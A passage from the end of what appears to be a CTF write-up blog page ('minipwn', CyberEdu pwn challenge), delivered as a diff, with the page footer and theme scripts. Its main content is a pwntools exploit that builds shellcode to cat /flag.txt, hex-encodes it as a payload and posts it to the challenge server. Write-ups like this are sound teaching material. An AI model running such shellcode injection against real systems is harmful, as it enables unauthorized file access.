+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ip, port <span style="color:#f92672">=</span> cyberedu<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;:&#39;</span>)
+</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> int(port)
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>stringy <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>shellcat <span style="color:#f92672">=</span> asm(shellcraft<span style="color:#f92672">.</span>cat(<span style="color:#e6db74">&#39;/flag.txt&#39;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>stringy <span style="color:#f92672">=</span> shellcat<span style="color:#f92672">.</span>hex(<span style="color:#e6db74">&#39; &#39;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;12 34 &#39;</span> <span style="color:#f92672">+</span> stringy 
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>print(payload)
+</span></span><span style="display:flex;"><span>print(len(payload))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;pwn&#39;</span>: (payload),
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;submit&#39;</span>: <span style="color:#e6db74">&#34;Pwn&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, data<span style="color:#f92672">=</span>data)
+</span></span><span style="display:flex;"><span>print(res<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>process(argv<span style="color:#f92672">=</span>[payload])
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/minipwn-writeup/flag1.png#center"></p>
+<p>This was the worst challenge I&rsquo;ve solved these days by <em>far</em>.</p>
+<hr>
+<p>As always, the full code can be found on my GitHub
+<strong><a href="https://github.com/irinasusca/ctf-writeups/blob/main/cyberedu/minipwn2.py">here</a></strong>.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/cyberedu/">CyberEdu</a></li>
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/pwn/">Pwn</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://irinasusca.github.io/writeup-blog/">Irina&#39;s CTF Writeups</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
